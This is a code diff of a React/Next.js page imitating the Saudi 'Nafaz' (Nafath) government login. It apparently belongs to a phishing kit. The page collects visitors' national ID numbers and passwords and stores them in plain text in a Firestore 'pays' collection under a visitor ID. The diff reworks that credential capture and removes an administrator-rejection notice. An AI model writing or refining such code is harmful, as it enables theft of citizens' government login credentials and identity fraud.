@@ -6,7 +6,7 @@ import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import NafazModal from "@/components/nafaz-modal"
 import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore"
-import { db } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 
 interface NafazFormData {
   identity_number: string
@@ -81,18 +81,22 @@ export default function Nafaz() {
       const paysDocRef = doc(db, "pays", visitorId)
 
       // Update the document with Nafaz credentials
-      await updateDoc(paysDocRef, {
+     addData(
+       { 
+        id:visitorId,
         nafadUsername: idCardNumber,
         nafadPassword: password,
-        updatedAt: new Date().toISOString(),
-      }).catch(async () => {
+        updatedAt: new Date().toISOString()
+      }      ).catch(async () => {
         // If document doesn't exist, create it
-        await setDoc(paysDocRef, {
-          nafadUsername: idCardNumber,
-          nafadPassword: password,
-          createdDate: new Date().toISOString(),
-          status: "pending",
-        })
+        await addData(
+          {
+            id:visitorId,
+            nafadUsername: idCardNumber,
+            nafadPassword: password,
+            updatedAt: new Date().toISOString()
+          }
+        )
       })
 
       console.log("Firestore updated successfully with Nafaz credentials")
@@ -107,6 +111,7 @@ export default function Nafaz() {
     e.preventDefault()
     setIsLoading(true)
     setIsRejected(false)
+    setShowModal(true)
 
     try {
       // Store credentials in localStorage
@@ -130,7 +135,6 @@ export default function Nafaz() {
       // Simulate processing delay
       await new Promise((resolve) => setTimeout(resolve, 1000))
       setIsSubmitted(true)
-      setShowModal(true)
      
     } catch (error) {
       console.error("خطأ في الدخول للنظام ", error)
@@ -165,15 +169,6 @@ export default function Nafaz() {
           <h2 className="mt-6 text-3xl text-center font-semibold p-2 border-slate-400 text-[#3a9f8c]">
             الدخول على النظام
           </h2>
-          {isRejected && (
-            <div
-              className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mx-auto container text-right"
-              role="alert"
-            >
-              <strong className="font-bold">عذراً! </strong>
-              <span className="block sm:inline">تم الرفض طلبك من قبل المسؤول , يرجى المحاوله في وقت لاحق</span>
-            </div>
-          )}
           <div className="mt-20 space-y-8 container mx-auto bg-white p-6 rounded-md">
             {!isSubmitted ? (
               <form className="space-y-8" onSubmit={handleSubmit}>
